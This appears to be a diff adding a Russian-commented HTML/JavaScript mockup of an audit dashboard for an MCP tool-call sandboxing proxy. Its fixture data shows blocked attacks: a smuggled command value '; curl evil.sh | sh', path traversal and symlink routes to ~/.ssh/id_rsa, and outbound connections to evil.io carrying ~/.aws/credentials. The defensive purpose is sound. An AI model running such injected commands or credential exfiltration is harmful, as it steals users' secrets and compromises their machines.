+.confirm .hint{font-size:var(--text-sm);color:var(--text-secondary);margin-top:var(--space-3)}
+.confirm .hint.ready{color:var(--state-ok)}
+.scopes{display:grid;grid-template-columns:auto 1fr;gap:var(--space-5) var(--space-6);
+  align-items:center;font-size:var(--text-sm);margin-top:var(--space-6)}
+.scopes select{padding:var(--space-3) var(--space-5);border-radius:var(--radius-sm);
+  border:1px solid var(--border-default);background:var(--bg-sunken)}
+.scopes .abs{font-size:var(--text-sm);color:var(--text-secondary);font-variant-numeric:tabular-nums}
+.win-foot{padding:var(--space-6) var(--space-7);border-top:1px solid var(--border-subtle);
+  display:flex;gap:var(--space-5);align-items:center}
+.win-foot .spacer{flex:1}
+</style>
+</head>
+<body>
+
+<div class="mock-bar">
+  <label>Состояние
+    <select id="stateSel"></select>
+  </label>
+  <button class="btn-secondary" id="themeBtn" type="button" style="padding:4px 12px">Тема</button>
+  <span class="spacer"></span>
+  <span class="mock-note">макет E7 · токены из @mcpproxy/design · копия строк = то, что поедет в код</span>
+</div>
+
+<div id="app"></div>
+
+<script>
+/* ═══════════════════════════════════════════════════════════════════════════
+   Семантика — зеркало packages/design/src/semantic.ts. Роли и подписи не
+   выдумываются здесь: они уже отгружены и типизированы от контрактов.
+   ═══════════════════════════════════════════════════════════════════════ */
+const verdictLabel = { allowed:'разрешено', denied:'отказано', pending_approval:'ждёт апрува', error:'ошибка' };
+const verdictRole  = { allowed:'ok', denied:'warn', pending_approval:'info', error:'danger' };
+/* Стадии `approval` в записи ещё нет: durationUs обязателен, то есть событие
+   пишется по завершении стадии, а подтверждение ещё не получено. Ожидание —
+   это вердикт последнего события, а не отдельная строка стадии. Псевдостадия
+   ниже существует только в макете, чтобы показать, как выглядит ожидание. */
+const stageLabel = {
+  classify_risk_pending:'ожидание подтверждения',
+  received:'принят', lock_check:'сверка lock', validate:'валидация',
+  resolve_paths:'резолв путей', build_argv:'сборка argv', classify_risk:'оценка риска',
+  approval:'подтверждение', build_env:'сборка env', build_profile:'профиль песочницы',
+  spawn:'запуск', violation:'нарушение', redact:'редакция', complete:'завершено',
+};
+const stageOrder = ['received','lock_check','validate','resolve_paths','build_argv',
+  'classify_risk','approval','build_env','build_profile','spawn','violation','redact','complete'];
+const riskLabel = { low:'низкий', medium:'средний', high:'высокий' };
+const riskRole  = { low:'ok', medium:'warn', high:'danger' };
+const sandboxLabel = { none:'без песочницы', seatbelt:'seatbelt', container:'контейнер' };
+const violationLabel = { network:'сеть', 'file-read':'чтение', 'file-write':'запись',
+  'mandatory-deny':'persistence', process:'процесс' };
+const annotationLabel = { readOnlyHint:'только чтение', destructiveHint:'разрушительный',
+  idempotentHint:'идемпотентный', openWorldHint:'внешний мир' };
+
+/* Роль нарушения зависит и от типа, и от исхода. `network denied` — янтарь:
+   песочница отбила. Тот же `network` с `action: 'allowed'` — красный:
+   данные ушли. Отгруженный violationRole(type) этого различия не делает. */
+function violationRole(type, action) {
+  if (type === 'mandatory-deny') return 'danger';
+  return action === 'denied' ? 'warn' : 'danger';
+}
+/* «Отбито» и «прошло» — словарь самой дизайн-системы (янтарь = отбито,
+   защита сработала). Слово «отказано» занято вердиктом ВЫЗОВА: поставить его
+   рядом с бейджем «разрешено» значит написать противоречие. */
+function violationVerb(action) { return action === 'denied' ? 'Отбито' : 'Прошло'; }
+
+/* Текстовые глифы, наследующие color. Эмодзи рисуется своим шрифтом и
+   игнорирует роль: янтарные песочные часы на синей строке. */
+const ICON = { ok:'✓', warn:'⊘', danger:'✕', info:'⋯', muted:'·' };
+
+/* ═══ Фикстуры. Форма — AuditEvent из @mcpproxy/contracts. Необязательное
+   поле ОТСУТСТВУЕТ как ключ; `argv: []` у остановленного вызова был бы
+   выдуманной пустой командой. ═══════════════════════════════════════════ */
+const CALLS = [
+  {
+    id:'c9', paramSlots:['v2.4.0'], time:'14:22:07', toolName:'publish_release', verdict:'pending_approval',
+    stopAt:'approval', risk:{tier:'high'},
+    params:'tag: "v2.4.0"',
+    argv:['./scripts/publish.sh','v2.4.0'], cwd:'/Users/y/work/demo-repo',
+    sandbox:{mode:'seatbelt', network:['registry.npmjs.org','api.github.com']},
+    stages:[
+      ['received',420,'вызов от сессии s-7f3a'],
+      ['lock_check',1180,'рецепт совпадает с lock'],
+      ['validate',860,'tag соответствует ^v\\d+\\.\\d+\\.\\d+$'],
+      ['resolve_paths',2210,'./scripts/publish.sh → /Users/y/work/demo-repo/scripts/publish.sh'],
+      ['build_argv',310,'2 элемента, подстановок в exec[0] нет'],
+      ['classify_risk',180,'destructive + openWorld → высокий'],
+      ['classify_risk_pending',null,'ожидает подтверждения вне контекста модели'],
+    ],
+  },
+  {
+    id:'c8', paramSlots:['release'], time:'14:19:44', toolName:'build_project', verdict:'allowed',
+    params:'target: "release"',
+    argv:['pnpm','build','--mode','release'], cwd:'/Users/y/work/demo-repo',
+    sandbox:{mode:'seatbelt'},
+    risk:{tier:'medium'}, overheadMs:7, exit:{code:0,signal:null},
+    output:{bytes:8214,truncated:false},
+    violations:[
+      {type:'mandatory-deny',target:'/Users/y/work/demo-repo/.git/hooks/pre-commit',action:'denied',bytes:0},
+      {type:'mandatory-deny',target:'/Users/y/.zshrc',action:'denied',bytes:0},
+    ],
+    stages:[
+      ['received',380,'вызов от сессии s-7f3a'],
+      ['lock_check',1090,'рецепт совпадает с lock'],
+      ['validate',640,'target входит в enum [debug, release]'],
+      ['resolve_paths',1870,'cwd → /Users/y/work/demo-repo'],
+      ['build_argv',290,'4 элемента'],
+      ['classify_risk',150,'не разрушительный, не внешний мир → средний'],
+      ['build_env',540,'PATH HOME LANG CI'],
+      ['build_profile',2100,'запись: dist, node_modules/.cache, /tmp'],
+      ['spawn',9840000,'pnpm build --mode release'],
+      ['violation',0,'запись в .git/hooks/pre-commit'],
+      ['violation',0,'запись в ~/.zshrc'],
+      ['redact',1240,'совпадений правил редакции нет'],
+      ['complete',0,'код выхода 0'],
+    ],
+  },
+  {
+    id:'c7', paramSlots:['auth'], time:'14:16:02', toolName:'run_tests', verdict:'allowed',
+    pairNote:'тот же вызов, повторён с песочницей',
+    params:'pattern: "auth"',
+    argv:['pnpm','test','--testPathPattern','auth'], cwd:'/Users/y/work/demo-repo',
+    sandbox:{mode:'seatbelt'},
+    risk:{tier:'medium'}, overheadMs:7, exit:{code:0,signal:null},
+    output:{bytes:4096,truncated:false},
+    redactions:[{rule:'npm-token', count:1, stream:'stdout'}],
+    violations:[
+      {type:'network',target:'evil.io:443',action:'denied',bytes:0},
+      {type:'file-read',target:'/Users/y/.aws/credentials',action:'denied',bytes:0},
+    ],
+    stages:[
+      ['received',340,'вызов от сессии s-7f3a'],
+      ['lock_check',1020,'рецепт совпадает с lock'],
+      ['validate',720,'pattern соответствует ^[\\w./-]{0,64}$'],
+      ['resolve_paths',1640,'cwd → /Users/y/work/demo-repo'],
+      ['build_argv',260,'4 элемента, pattern отдельным элементом'],
+      ['classify_risk',140,'не разрушительный, не внешний мир → средний'],
+      ['build_env',480,'PATH HOME LANG CI'],
+      ['build_profile',1980,'сеть запрещена, запись: coverage, node_modules/.cache, /tmp'],
+      ['spawn',12400000,'pnpm test --testPathPattern auth'],
+      ['violation',0,'исходящее соединение на evil.io:443'],
+      ['violation',0,'чтение ~/.aws/credentials'],
+      ['redact',1310,'npm-token — 1 совпадение в stdout'],
+      ['complete',0,'код выхода 0'],
+    ],
+  },
+  {
+    id:'c6', paramSlots:['auth'], time:'14:15:58', toolName:'run_tests', verdict:'allowed',
+    pairNote:'тот же вызов, четырьмя секундами раньше — без песочницы',
+    params:'pattern: "auth"',
+    argv:['pnpm','test','--testPathPattern','auth'], cwd:'/Users/y/work/demo-repo',
+    sandbox:{mode:'none'},
+    risk:{tier:'medium'}, overheadMs:5, exit:{code:0,signal:null},
+    output:{bytes:4096,truncated:false},
+    violations:[
+      {type:'network',target:'evil.io:443',action:'allowed',bytes:1247},
+      {type:'file-read',target:'/Users/y/.aws/credentials',action:'allowed',bytes:1247},
+    ],
+    stages:[
+      ['received',330,'вызов от сессии s-7f3a'],
+      ['lock_check',1010,'рецепт совпадает с lock'],
+      ['validate',700,'pattern соответствует ^[\\w./-]{0,64}$'],
+      ['resolve_paths',1600,'cwd → /Users/y/work/demo-repo'],
+      ['build_argv',250,'4 элемента, pattern отдельным элементом'],
+      ['classify_risk',140,'не разрушительный, не внешний мир → средний'],
+      ['build_env',470,'PATH HOME LANG CI'],
+      ['build_profile',0,'профиль не применяется — процесс запущен с вашими правами'],
+      ['spawn',11900000,'pnpm test --testPathPattern auth'],
+      ['violation',0,'исходящее соединение на evil.io:443'],
+      ['violation',0,'прочитан ~/.aws/credentials'],
+      ['redact',1180,'совпадений правил редакции нет'],
+      ['complete',0,'код выхода 0'],
+    ],
+  },
+  {
+    id:'c5', time:'14:11:20', toolName:'analyze_logs', verdict:'denied',
+    stopAt:'lock_check', params:'file: "logs/app.log"',
+    cwd:null, sandbox:null, risk:null,
+    denyReason:'определение рецепта разошлось с mcpproxy.lock',
+    stages:[
+      ['received',310,'вызов от сессии s-7f3a'],
+      ['lock_check',1440,'расхождение: изменён argv рецепта'],
+    ],
+  },
+  {
+    id:'c4', time:'14:09:03', toolName:'analyze_logs', verdict:'denied',
+    stopAt:'resolve_paths', params:'file: "logs/nightly.log"',
+    cwd:'/Users/y/work/demo-repo',
+    denyReason:'символическая ссылка ведёт за границу confinement',
+    risk:{tier:'low'},
+    stages:[
+      ['received',300,'вызов от сессии s-7f3a'],
+      ['lock_check',990,'рецепт совпадает с lock'],
+      ['validate',610,'file соответствует схеме параметра path'],
+      ['resolve_paths',2380,'logs/nightly.log → /Users/y/.ssh/id_rsa · граница: /Users/y/work/demo-repo/logs'],
+    ],
+  },
+  {
+    id:'c3', time:'14:07:41', toolName:'analyze_logs', verdict:'denied',
+    stopAt:'resolve_paths', params:'file: "../../.ssh/id_rsa"',
+    cwd:'/Users/y/work/demo-repo',
+    denyReason:'резолвнутый путь вне корня logs',
+    risk:{tier:'low'},
+    stages:[
+      ['received',290,'вызов от сессии s-7f3a'],
+      ['lock_check',980,'рецепт совпадает с lock'],
+      ['validate',600,'file соответствует схеме параметра path'],
+      ['resolve_paths',2140,'../../.ssh/id_rsa → /Users/y/.ssh/id_rsa · граница: /Users/y/work/demo-repo/logs'],
+    ],
+  },
+  {
+    id:'c2', time:'14:05:12', toolName:'run_tests', verdict:'denied',
+    stopAt:'validate', params:'pattern: "; curl evil.sh | sh"',
+    denyReason:'значение не соответствует ^[\\w./-]{0,64}$',
+    stages:[
+      ['received',280,'вызов от сессии s-7f3a'],
+      ['lock_check',960,'рецепт совпадает с lock'],
+      ['validate',830,'pattern: значение не соответствует ^[\\w./-]{0,64}$'],
+    ],
+  },
+];
+
+const TOOLS = [
+  { name:'run_tests', tier:'medium',
+    sentence:'Запускает тесты проекта. Не выходит в сеть, пишет только в coverage, кэш и /tmp.',
+    exec:'pnpm test', ann:{readOnlyHint:false,destructiveHint:false,idempotentHint:true,openWorldHint:false},
+    silent:[], read:['.'], write:['coverage','node_modules/.cache','/tmp'], net:[] },
+  { name:'build_project', tier:'medium',
+    sentence:'Собирает проект. Не выходит в сеть, пишет только в dist, кэш и /tmp.',
+    exec:'pnpm build', ann:{readOnlyHint:false,destructiveHint:false,idempotentHint:true,openWorldHint:false},
+    silent:[], read:['.'], write:['dist','node_modules/.cache','/tmp'], net:[] },
+  { name:'analyze_logs', tier:'low',
+    sentence:'Читает один файл из ./logs. Ничего не пишет и не выходит в сеть.',
+    exec:'./scripts/analyze-logs.sh', ann:{readOnlyHint:true},
+    silent:['destructiveHint','idempotentHint','openWorldHint'], read:['./logs'], write:[], net:[] },
+  { name:'publish_release', tier:'high',
+    sentence:'Публикует релиз. Выходит в сеть и меняет внешнее состояние — требует подтверждения человеком.',
+    exec:'./scripts/publish.sh', ann:{readOnlyHint:false,destructiveHint:true,idempotentHint:false,openWorldHint:true},
+    silent:[], read:['.'], write:[], net:['registry.npmjs.org','api.github.com'] },
+];
+
+/* Инбокс и окно — разные поверхности. Окно принимает решение по одному
+   запросу и является authoritative; инбокс показывает очередь и решений не
+   принимает. Слить их значило бы сделать рутинную поверхность authoritative
+   — ровно та ошибка, из-за которой 93% запросов разрешения одобряют не глядя. */
+const PENDING = [
+  { requestId:'r-4c1e9a77', recipeName:'publish_release', tier:'high',
+    argv:['./scripts/publish.sh','v2.4.0'], waiting:'2 мин', session:'s-7f3a' },
+];
+
+const ENTRIES = [
+  { n:1284, at:'14:22:07', what:'publish_release · подтверждение', hash:'9f2c41ab8e7d5c03…' },
+  { n:1283, at:'14:19:44', what:'build_project · завершено',       hash:'3ad0e91f772bb14c…' },
+  { n:1282, at:'14:19:44', what:'build_project · нарушение',       hash:'c81b6de409a3f527…' },
+  { n:1281, at:'14:16:02', what:'run_tests · завершено',           hash:'55e7a2c1d0f8b936…' },
+  { n:1280, at:'14:16:02', what:'run_tests · редакция',            hash:'0b4f83e6ca27d915…' },
+];
+
+/* При разрыве список обязан показывать саму точку разрыва: заголовок,
+   называющий запись №1102, над хвостом из №1280+ отправляет искать её
+   вручную. И «недоказуемое» визуально отделено от «подделанного» —
+   это разные утверждения. */
+const BROKEN_VIEW = [
+  { n:1104, at:'13:58:11', what:'analyze_logs · завершено', hash:'7e2244c9a1b0f83d…', beyond:true },
+  { n:1103, at:'13:58:11', what:'analyze_logs · редакция',  hash:'ba90e17c5d2f4468…', beyond:true },
+  { n:1102, at:'13:57:40', what:'run_tests · завершено',    hash:'11ff03ab6c8e97d2…', at_break:true },
+  { n:1101, at:'13:57:40', what:'run_tests · редакция',     hash:'48c7b0e3fa15d926…' },
+  { n:1100, at:'13:57:28', what:'run_tests · запуск',       hash:'d3061e8bb47c2a5f…' },
+];
+
+/* ═══ Стадии → группы для свёрнутой полосы ══════════════════════════════ */
+const GROUPS = [
+  ['received','lock_check','validate','resolve_paths','build_argv','classify_risk'],
+  ['approval','build_env','build_profile'],
+  ['spawn','violation','redact','complete'],
+];
+
+/* Машинные фрагменты — моноширинные и без переноса по словам: разорванный
+   путь или аргумент читается как два разных. Кириллическая «а» в `--flаg`
+   пропорциональным шрифтом не отличается от латинской. */
+const MACHINE = /(\/[\w./~-]+|~\/[\w./-]+|\^[^\s]+\$|[\w.-]+:\d+|--?[\w-]+|\S+\.(?:sh|log|json|yaml))/g;
+const machine = (t) => esc(t).replace(MACHINE, (m) => `<span class="mono nowrap">${m}</span>`);
+const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+const us = (n) => (n === null || n === 0) ? '—'
+  : n >= 1000000 ? (n/1000000).toFixed(1)+' с' : (n/1000).toFixed(1)+' мс';
+
+function callRole(c) {
+  if (c.verdict === 'pending_approval') return 'info';
+  if (c.verdict === 'denied') return 'warn';
+  if (c.verdict === 'error') return 'danger';
+  const v = c.violations || [];
+  if (v.some((x) => violationRole(x.type, x.action) === 'danger')) return 'danger';
+  if (v.length) return 'warn';
+  return 'ok';
+}
+function callLine(c) {
+  const role = callRole(c);
+  if (c.verdict === 'denied')
+    return { role:'warn', verb:'Отказано', rest:`${c.denyReason} · стадия «${stageLabel[c.stopAt]}»` };
+  if (c.verdict === 'pending_approval')
+    return { role:'info', verb:'Ждёт подтверждения', rest:'высокий риск — окно вне контекста модели' };
+  const v = c.violations || [];
+  if (!v.length) return { role:'ok', verb:'Выполнено', rest:`код выхода ${c.exit.code} · оверхед ${c.overheadMs} мс` };
+  const worst = v.find((x) => violationRole(x.type, x.action) === 'danger') || v[0];
+  const sent = worst.action === 'allowed' && worst.bytes > 0 ? ` — ${worst.bytes} байт` : '';
+  return {
+    role, verb: violationVerb(worst.action),
+    rest: `${violationLabel[worst.type]}: ${worst.target}${sent}${v.length > 1 ? ` и ещё ${v.length - 1}` : ''}`,
+  };
+}
+function stageRole(c, stage, i) {
+  if (stage === 'violation') {
+    const v = (c.violations || [])[i] || {};
+    return violationRole(v.type, v.action);
+  }
+  /* Зелёная галочка рядом с «песочницы нет» противоречит правилу
+     «sandbox: none красится опасным всегда» — и делает это в центре S5. */
+  if (stage === 'build_profile' && c.sandbox && c.sandbox.mode === 'none') return 'danger';
+  if (c.stopAt === stage) return c.verdict === 'pending_approval' ? 'info' : 'warn';
+  return 'ok';
+}
+
+/* ═══ Отрисовка ═════════════════════════════════════════════════════════ */
+const S = { screen:'timeline', mode:'seatbelt', sel:'c7', overlay:null, loading:false,
+            empty:false, chainBroken:false, typed:'', filter:null, ttl:'once' };
+
+function groupBar(c) {
+  const seen = new Set(c.stages.map((s) => s[0]));
+  const rank = { ok:0, info:1, warn:2, danger:3 };
+  return `<div class="groupbar" aria-hidden="true">${GROUPS.map((g) => {
+    const hit = g.filter((x) => seen.has(x));
+    if (!hit.length) return `<span class="grp" style="flex:${g.length}"><i class="g-skip" style="flex:1"></i></span>`;
+    /* Худший исход внутри группы, а не первый: у стадии `violation` в одном
+       вызове бывает несколько записей с разными ролями. */
+    let worst = 'ok';
+    hit.forEach((name) => {
+      let vi = -1;
+      c.stages.forEach(([n]) => {
+        if (n !== name) return;
+        if (n === 'violation') vi += 1;
+        const r = stageRole(c, n, n === 'violation' ? vi : 0);
+        if (rank[r] > rank[worst]) worst = r;
+      });
+    });
+    return `<span class="grp" style="flex:${g.length}">`
+      + `<i class="g-${worst}" style="flex:${hit.length}"></i>`
+      + (hit.length < g.length ? `<i class="g-skip" style="flex:${g.length - hit.length}"></i>` : '')
+      + `</span>`;
+  }).join('')}</div>`;
+}
+
+function renderCallList() {
+  if (S.loading) {
+    /* Геометрия скелета повторяет наполненную строку бокс в бокс: иначе
+       подгрузка даёт скачок вёрстки на всю разницу высот. */
+    return Array.from({length:5}, () => `<div class="call">
+      <div class="call-top">
+        <span class="call-name mono"><span class="skel" style="width:132px"></span></span>
+        <span class="badge badge--muted"><span class="skel" style="width:56px"></span></span>
+        <span class="call-time"><span class="skel" style="width:44px"></span></span>
+      </div>
+      <div class="call-line"><span class="call-icon"></span>
+        <span class="skel" style="width:64%"></span></div>
+      <div class="groupbar"><span class="grp" style="flex:1"><i class="g-skip" style="flex:1"></i></span></div>
+    </div>`).join('');
+  }
+  if (S.empty) {
+    return `<div class="empty"><b>Вызовов пока не было</b>
+      Прокси запущен и слушает сокет. Здесь появится каждый вызов инструмента —
+      и разрешённый, и отклонённый.</div>`;
+  }
+  return CALLS.map((c) => {
+    const l = callLine(c);
+    /* Вердикт вызова и исход песочницы — разные оси. Когда нарушение прошло
+       насквозь, зелёное «разрешено» оказывается самым ярким пятном на строке
+       катастрофы: вызов действительно разрешён, но новость не в этом. */
+    const leaked = (c.violations || []).some((v) => violationRole(v.type, v.action) === 'danger');
+    const vRole = leaked ? 'muted' : verdictRole[c.verdict];
+    /* Режим песочницы обязан быть в строке: без него два соседних вызова S5
+       отличаются одним словом, и зал не видит, что режимы разные. */
+    const mBadge = c.sandbox
+      ? `<span class="badge badge--${c.sandbox.mode === 'none' ? 'danger' : 'ok'}">${sandboxLabel[c.sandbox.mode]}</span>`
+      : '';
+    return `<button class="call role-${l.role}" data-call="${c.id}" role="option"
+      aria-selected="${S.sel === c.id}">
+      <div class="call-top">
+        <span class="call-name mono">${esc(c.toolName)}</span>
+        <span class="badge badge--${vRole}">${verdictLabel[c.verdict]}</span>
+        ${mBadge}
+        <span class="call-time">${c.time}</span>
+      </div>
+      <div class="call-line role-${l.role}">
+        <span class="call-icon" aria-hidden="true">${ICON[l.role]}</span>
+        <b>${l.verb} —</b><span>${esc(l.rest)}</span></div>
+      ${groupBar(c)}
+      ${c.pairNote ? `<span class="pairnote">${esc(c.pairNote)}</span>` : ''}
+    </button>`;
+  }).join('');
+}
+
+/* При загрузке правая панель показывает скелет секций, а не сообщение об
+   отсутствии данных: данные грузятся, а не отсутствуют. */
+function renderDetailSkeleton() {
+  const line = (w) => `<div style="margin-bottom:8px"><span class="skel" style="width:${w}"></span></div>`;
+  return `<div class="detail-scroll">
+    <div class="dsec"><span class="eyebrow">Вызов</span>${line('60%')}${line('44%')}${line('52%')}</div>
+    <div class="dsec"><span class="eyebrow">Команда</span>
+      <div class="argvbox"><span class="skel" style="width:70%"></span></div></div>
+    <div class="dsec"><span class="eyebrow">Стадии</span>
+      ${line('82%')}${line('76%')}${line('80%')}${line('68%')}${line('74%')}</div>
+  </div>`;
+}
+
+function renderDetail() {
+  const c = CALLS.find((x) => x.id === S.sel);
+  if (!c) return `<div class="empty"><b>Вызов не выбран</b>Выберите строку слева.</div>`;
+  const absent = stageOrder.filter((s) => !c.stages.some((x) => x[0] === s));
+
+  /* Подсвечивается происхождение, а не позиция: выделено то, что пришло
+     от модели через параметр. Роли состояний на подсветку не тратятся —
+     синий значит «ждём человека», а не «это аргумент». */
+  const argvHtml = c.argv
+    ? `<div class="argvbox">${c.argv.map((a) => {
+        const fromModel = (c.paramSlots || []).includes(a);
+        return `<span class="arg${fromModel ? ' arg-param' : ''}">${esc(a)}</span>`;
+      }).join(' ')}</div>
+      ${(c.paramSlots || []).length ? `<p class="argv-legend">Подсвечено — подставлено из
+        параметров вызова; остальное задано манифестом и модели недоступно.</p>` : ''}`
+    : `<p class="argv-none">Команда не собиралась: вызов остановлен на стадии
+         «${stageLabel[c.stopAt]}», до сборки argv он не дошёл.</p>`;
+
+  let vi = -1;
+  const stagesHtml = c.stages.map(([name, dur, detail]) => {
+    if (name === 'violation') vi += 1;
+    const role = stageRole(c, name, name === 'violation' ? vi : 0);
+    return `<div class="stage role-${role}">
+      <span class="stage-icon" aria-hidden="true">${ICON[role]}</span>
+      <span class="stage-name">${stageLabel[name]}</span>
+      <span class="stage-ms">${us(dur)}</span>
+      <span class="stage-detail">${machine(detail)}</span>
+    </div>`;
+  }).join('');
+
+  return `<div class="detail-scroll">
+    <div class="dsec">
+      <span class="eyebrow">Вызов</span>
+      <dl class="kv">
+        <dt>инструмент</dt><dd><button class="chipfilter">${esc(c.toolName)}</button></dd>
+        <dt>вердикт</dt><dd><span class="badge badge--${verdictRole[c.verdict]}">${verdictLabel[c.verdict]}</span></dd>
+        ${c.risk ? `<dt>риск</dt><dd><span class="badge badge--${riskRole[c.risk.tier]}">${riskLabel[c.risk.tier]}</span></dd>` : ''}
+        ${c.cwd ? `<dt>рабочий каталог</dt><dd><button class="chipfilter">${esc(c.cwd)}</button></dd>` : ''}
+        ${c.sandbox ? `<dt>песочница</dt><dd><span class="badge badge--${c.sandbox.mode === 'none' ? 'danger' : 'ok'}">${sandboxLabel[c.sandbox.mode]}</span></dd>` : ''}
+      </dl>
+    </div>
+
+    ${c.denyReason ? `<div class="denybox">
+      <span class="deny-verb">Отказано на стадии «${stageLabel[c.stopAt]}»</span>
+      <span class="deny-why">${machine(c.denyReason)}</span>
+      <span class="deny-note">Вызов до стадии «запуск» не дошёл: процесс не создавался.</span>
+    </div>` : ''}
+
+    <div class="dsec">
+      <span class="eyebrow">Команда</span>
+      ${argvHtml}
+    </div>
+
+    <div class="dsec">
+      <span class="eyebrow">Стадии</span>
+      <div class="stages">${stagesHtml}</div>
+      ${absent.length ? `<p class="stage-absent">Не выполнялись и в записи отсутствуют:
+        ${absent.map((s) => stageLabel[s]).join(', ')}.</p>` : ''}
+      ${c.overheadMs !== undefined ? `<div class="overhead"><b>${c.overheadMs} мс</b>
+        <span>оверхед прокси — сумма стадий вне запуска, нарушений, подтверждения и завершения</span></div>` : ''}
+    </div>
+
+    ${c.redactions ? `<div class="dsec"><span class="eyebrow">Редакция</span>
+      <dl class="kv">${c.redactions.map((r) => `<dt>${esc(r.rule)}</dt>
+        <dd>${r.count} совпадение в ${esc(r.stream)}</dd>`).join('')}</dl></div>` : ''}
+  </div>`;
+}
+
+function renderViolations() {
+  const rows = [];
+  CALLS.forEach((c) => (c.violations || []).forEach((v) => rows.push({ c, v })));
+  if (S.empty || !rows.length) {
+    return `<div class="empty"><b>Нарушений не зафиксировано</b>
+      Панель обновляется по мере вызовов. Каждая попытка выйти в сеть, прочитать
+      или записать вне разрешённого появится здесь — и отбитая, и прошедшая.</div>`;
+  }
+  return rows.map(({ c, v }) => {
+    const role = violationRole(v.type, v.action);
+    return `<div class="vrow role-${role}">
+      <span class="vrow-icon" aria-hidden="true">${ICON[role]}</span>
+      <span class="badge badge--${role}">${violationLabel[v.type]}</span>
+      <span class="vrow-what">
+        <b>${violationVerb(v.action)} — процесс стучался на</b>
+        <span class="mono">${esc(v.target)}</span>
+      </span>
+      <span class="vrow-meta">${v.bytes} байт<br>${c.time} · ${sandboxLabel[c.sandbox.mode]}</span>
+    </div>`;
+  }).join('');
+}
+
+function renderPolicy() {
+  return TOOLS.map((t) => {
+    const wide = t.net.some((d) => d.includes('*'));
+    const readOnly = t.silent.includes('readOnlyHint') ? false : t.ann.readOnlyHint;
+    const badges = Object.keys(annotationLabel).map((k) => {
+      /* Оговорка спеки MCP: destructiveHint и idempotentHint значимы только при
+         readOnlyHint == false. Показывать их у read-only рецепта — врать. */
+      if (readOnly && (k === 'destructiveHint' || k === 'idempotentHint')) {
+        return `<span class="badge badge--muted">${annotationLabel[k]}: не применимо</span>`;
+      }
+      const silent = t.silent.includes(k);
+      const val = silent ? (k === 'destructiveHint' || k === 'openWorldHint') : t.ann[k];
+      const role = (k === 'readOnlyHint' || k === 'idempotentHint') ? (val ? 'ok' : 'muted')
+        : k === 'destructiveHint' ? (val ? 'danger' : 'muted') : (val ? 'warn' : 'muted');
+      return `<span class="badge badge--${role}">${annotationLabel[k]}: ${val ? 'да' : 'нет'}${silent ? ' (по умолчанию)' : ''}</span>`;
+    }).join('');
+    const silentOn = (tool, key) => tool.silent.includes(key);
+    const silentShown = t.silent.filter((k) => !(readOnly && (k === 'destructiveHint' || k === 'idempotentHint')));
+    return `<div class="tool">
+      <div class="tool-top">
+        <span class="tool-name">${t.name}</span>
+        <span class="badge badge--${riskRole[t.tier]}">риск ${riskLabel[t.tier]}</span>
+        ${wide ? '<span class="weakened">ослабленный режим</span>' : ''}
+      </div>
+      <p class="tool-sentence">${esc(t.sentence)}</p>
+      <div class="tool-badges">${badges}</div>
+      <div class="register">
+        <span class="eyebrow"></span>
+        <span class="eyebrow">заявлено манифестом</span>
+        <span class="eyebrow">обеспечено прокси</span>
+        ${[
+          ['сеть', silentOn(t,'openWorldHint') ? 'внешний мир: да (по умолчанию)'
+              : `внешний мир: ${t.ann.openWorldHint ? 'да' : 'нет'}`,
+            t.net.length ? t.net.join(', ') : 'запрещена',
+            (silentOn(t,'openWorldHint') || t.ann.openWorldHint) && !t.net.length],
+          ['запись', readOnly ? 'только чтение: да'
+              : `разрушительный: ${t.ann.destructiveHint ? 'да' : 'нет'}`,
+            t.write.length ? t.write.join(', ') : 'не разрешена', false],
+          ['чтение', `только чтение: ${readOnly ? 'да' : 'нет'}`,
+            t.read.length ? t.read.join(', ') : 'не разрешено', false],
+        ].map(([axis, claimed, enforced, diverges]) => `
+          <span class="axis">${axis}</span>
+          <span class="claimed${diverges ? ' diverges' : ''}">${esc(claimed)}</span>
+          <span class="enforced mono">${esc(enforced)}</span>`).join('')}
+      </div>
+      ${silentShown.length ? `<p class="claimwarn"><span aria-hidden="true">⊘</span>
+        <span>Манифест молчит про ${silentShown.map((k) => annotationLabel[k]).join(', ')},
+        а молчание по спецификации MCP означает «да», а не «не задано» — показано именно «да».
+        Прокси при этом сеть запрещает. Расхождение между заявленным и обеспеченным —
+        то, ради чего здесь два регистра: аннотации спека велит считать недоверенными.</span></p>` : ''}
+    </div>`;
+  }).join('');
+}
+
+function renderAudit() {
+  const broken = S.chainBroken;
+  const box = broken
+    ? `<div class="chainbox broken">
+        <div class="chain-head">
+          <span class="badge badge--danger">цепочка разошлась</span>
+          <span class="chain-claim">на записи №1102</span>
+          <span class="chain-anchor">проверено только что</span>
+        </div>
+        <ul class="checklist">
+          <li><span class="m no">✕</span><span>Связь <span class="mono">prev → self</span> нарушена начиная с записи №1102</span></li>
+          <li><span class="m ok">✓</span><span>Записи №1–1101 пересчитаны и сходятся</span></li>
+          <li><span class="m na">—</span><span>Внешнего якоря нет: усечение хвоста этой проверкой не обнаруживается</span></li>
+        </ul>
+        <p class="blast">О записях начиная с №1102 нельзя утверждать ничего — ни что они верны,
+          ни что они подделаны. Дальше цепочки доказательная сила кончается.</p>
+      </div>`
+    : `<div class="chainbox">
+        <div class="chain-head">
+          <span class="badge badge--ok">самосогласована</span>
+          <span class="chain-claim">1284 записи</span>
+          <span class="chain-anchor">проверено только что · без внешнего якоря</span>
+        </div>
+        <p class="chain-caveat">Tamper-evident, не tamper-proof: проверка означает
+          «правку заметно», а не «правка невозможна».</p>
+        <ul class="checklist">
+          <li><span class="m ok">✓</span><span>Каждая запись пересчитана по <span class="mono">sha256(JCS({prev, event}))</span></span></li>
+          <li><span class="m ok">✓</span><span>Связь <span class="mono">prev → self</span> непрерывна от №1 до №1284</span></li>
+          <li><span class="m na">—</span><span>Внешнего якоря нет: удаление хвоста лога оставит цепочку согласованной</span></li>
+        </ul>
+
+      </div>`;
+  const list = broken ? BROKEN_VIEW : ENTRIES;
+  return box + list.map((e) => `<div class="entry${e.at_break ? ' at-break' : ''}${e.beyond ? ' beyond' : ''}">
+      <span class="n">№${e.n}</span>
+      <span>${esc(e.what)}<span class="entry-at"> · ${e.at}</span>
+        ${e.at_break ? '<b class="break-tag">цепочка расходится здесь</b>' : ''}
+        ${e.beyond ? '<span class="beyond-tag">ничего утверждать нельзя</span>' : ''}</span>
+      <span class="h mono">${e.hash}</span>
+    </div>`).join('')
+    + (broken ? `<p class="beyond-note">Выше записи №1102 доказательная сила кончается:
+        они не подделаны и не верны — они непроверяемы.</p>` : '');
+}
+
+function renderLockModal() {
